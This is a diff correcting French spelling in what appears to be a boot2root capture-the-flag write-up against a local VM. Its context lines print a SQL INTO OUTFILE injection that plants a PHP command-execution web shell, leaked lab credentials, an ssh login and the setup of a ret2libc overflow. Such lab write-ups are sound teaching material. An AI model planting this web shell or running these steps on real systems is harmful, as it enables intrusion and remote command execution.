@@ -7,7 +7,7 @@ Une fois tout cela configuré, on lance la VM.
 ## Trouver l'IP de la VM
 Boot2root nous demande un login et un mot de passe que nous ne connaissons pas. Nous allons donc essayer de trouver l'IP de la VM pour y trouver plus d'informations.
 
-On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque un `vboxnet0` avec une adresse IP de `192.168.56.1`. Nous utilisons donc `nmap 192.168.56.0-255` afin scanner tout les réseaux entre `192.168.56.0` et `192.168.56.255`. `nmap` nous renvoit :
+On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque un `vboxnet0` avec une adresse IP de `192.168.56.1`. Nous utilisons donc `nmap 192.168.56.0-255` afin de scanner tout les réseaux entre `192.168.56.0` et `192.168.56.255`. `nmap` nous renvoit :
 ```
 > nmap 192.168.56.0-255
 21/tcp open ftp
@@ -35,7 +35,7 @@ On lance DIRB avec la commande suivante :
 ## Connexion au forum
 Avec un navigateur, on se connecte au forum en utilisant l'adresse `https://192.168.56.101/forum`. Le forum contient 3 sujets, donc un qui concerne des problèmes de connexion. Dans le post, on y trouve ce qui semble être des logs de connexion.
 
-On remqrque ici plusieurs choses:
+On remarque ici plusieurs choses:
 - Il y a un `session_closed(lmezard)` qui nous indique que lmezard s’est connecté.
 - Il y a un `Failed password for invalid user !q]Ej?5K5cyAJ`. Ce login ressemble à un mot de passe, comme si l'utilisateur avait tapé son mot de passe dans le champs du nom d'utilisateur.
 
@@ -59,7 +59,7 @@ On éxecute la commande SQL suivante pour y injecter notre page :
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE '/var/www/forum/templates_c/hacker5.php'
 ```
-La page contient uniquement un input faisant appel à la fonctione `system` de php, nous permettant par example d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
+La page contient donc maintenant un input faisant appel à la fonction `system` de php, nous permettant par exemple d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
 ```
 cd /home/LOOKATME ; cat password
 ```
@@ -480,7 +480,7 @@ void phase_6(int32_t arg_8h)
     return;
 }
 ```
-Le code est plus complèxe icc, mais les premières lignes nous permettent de comprendre deux choses :
+Le code est plus complexe ici, mais les premières lignes nous permettent de comprendre deux choses :
 - Le mot de passe contient 6 chiffres.
 - Les chiffres sont compris entre 1 et 6.
 
@@ -498,7 +498,7 @@ Publicspeakingisveryeasy.126241207201b2149opekma426315
 >
 > Le mot de passe final est donc `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
-On peut donc se connecter en ssh avec l'utiliseur thor :
+On peut donc se connecter en ssh avec l'utilisateur thor :
 ```
 ssh -p 22 thor@192.168.56.101
 ```
@@ -511,7 +511,7 @@ En arrivant sur le compte de `thor`, on remarque :
 - Un fichier `turtle` qui contitent des instructions similaires au language LOGO.
 - Un README qui contient : `Finish this challenge and use the result as password for 'zaz' user.`
  
- On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Avec le dessin nous montre les lettres `SLASH`.
+ On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Le dessin nous montre les lettres `SLASH`.
  
  À la fin du fichier `turtle`, il était indiqué de hasher ce mot. Le hash `md5` s'avère être la bonne solution. On obtient :
  ```
@@ -536,7 +536,7 @@ bool main(char **argv, char **envp)
     return (int32_t)argv < 2;
 }
 ```
-Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre agrument excède 140 charactère, le progamme `SEGFAULT`.
+Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre argument excède 140 caractères, le progamme `SEGFAULT`.
 
 Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.
 
